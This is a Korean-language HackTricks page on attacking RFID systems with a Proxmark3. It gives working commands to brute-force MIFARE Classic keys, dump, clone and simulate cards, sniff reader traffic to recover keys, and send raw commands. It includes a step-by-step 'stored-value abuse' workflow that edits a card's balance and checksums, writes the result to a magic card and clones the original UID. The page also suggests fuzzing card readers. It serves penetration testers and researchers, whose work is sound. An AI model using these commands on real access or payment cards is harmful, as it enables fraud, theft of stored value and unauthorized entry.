# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Proxmark3로 RFID 시스템 공격하기

가장 먼저 해야 할 일은 [**Proxmark3**](https://proxmark.com)를 준비하고 [**install the software and it's dependencie**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).

### MIFARE Classic 1KB 공격

이는 **16 sectors**, 각 섹터는 **4 blocks**이며 각 블록은 **16B**를 포함합니다. UID는 sector 0 block 0에 있으며(변경할 수 없습니다).\
각 섹터에 접근하려면 각 섹터의 **block 3 of each sector**(sector trailer)에 저장된 **2 keys**(**A** and **B**)가 필요합니다. 섹터 트레일러는 또한 **2 keys**를 사용하여 **each block**에 대한 **read and write** 권한을 부여하는 **access bits**를 저장합니다.\
**2 keys**는 예를 들어 첫 번째 키를 알면 읽기 권한을, 두 번째 키를 알면 쓰기 권한을 부여하는 식으로 유용합니다.

여러 공격을 수행할 수 있습니다
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
The Proxmark3는 민감한 데이터를 찾기 위해 **eavesdropping**과 같이 **Tag to Reader communication**을 도청하는 등 추가 동작을 수행할 수 있습니다. 이 카드의 경우 통신을 스니핑한 뒤 사용된 키를 계산할 수 있는데, 그 이유는 **cryptographic operations used are weak**하며 평문(plaintext)과 암호문(ciphertext)을 알면 (`mfkey64` 도구) 키를 계산할 수 있기 때문입니다.

#### MiFare Classic의 저장값(stored-value) 악용을 위한 빠른 워크플로우

터미널이 Classic 카드에 잔액을 저장할 때, 일반적인 엔드투엔드 흐름은 다음과 같습니다:
```bash
# 1) Recover sector keys and dump full card
proxmark3> hf mf autopwn

# 2) Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
proxmark3> hf mf cload -f modified.bin

# 4) Clone original UID so readers recognize the card
proxmark3> hf mf csetuid -u <original_uid>
```
노트

- `hf mf autopwn`은 nested/darkside/HardNested-style 공격을 조율하고, keys를 복구하며, client dumps folder에 덤프를 생성합니다.
- Writing block 0/UID는 magic gen1a/gen2 카드에서만 작동합니다. 일반 Classic 카드는 UID가 읽기 전용입니다.
- 많은 배포에서는 Classic "value blocks" 또는 단순한 checksums을 사용합니다. 편집 후 중복/보수된 필드와 checksums이 일관되는지 확인하세요.

상위 수준의 방법론 및 완화책은 다음을 참조하세요:

{{#ref}}
pentesting-rfid.md
{{#endref}}

### Raw 명령

IoT 시스템은 때때로 **nonbranded or noncommercial tags**를 사용합니다. 이 경우 Proxmark3를 사용해 태그로 보낼 커스텀 **raw 명령**을 전송할 수 있습니다.
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quiting Search
```
이 정보를 가지고 카드에 대한 정보와 카드와 통신하는 방법을 찾아볼 수 있습니다. Proxmark3는 다음과 같이 원시 명령을 전송할 수 있습니다: `hf 14a raw -p -b 7 26`

### 스크립트

Proxmark3 소프트웨어에는 간단한 작업을 수행할 때 사용할 수 있는 **자동화 스크립트** 목록이 미리 포함되어 있습니다. 전체 목록을 확인하려면 `script list` 명령을 사용하세요. 그런 다음 `script run` 명령 다음에 스크립트 이름을 붙여 실행합니다:
```
proxmark3> script run mfkeys
```
스크립트를 만들어 **fuzz tag readers**할 수 있습니다. 즉, **valid card**의 데이터를 복사한 뒤 **Lua script**로 하나 이상의 무작위 **bytes**를 **randomize**하고 각 반복에서 **reader crashes**하는지 확인하면 됩니다.

## 참고자료

- [Proxmark3 wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [Proxmark3 wiki: HF Magic cards](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [NXP statement on MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [NFC card vulnerability exploitation in KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)

{{#include ../../banners/hacktricks-training.md}}
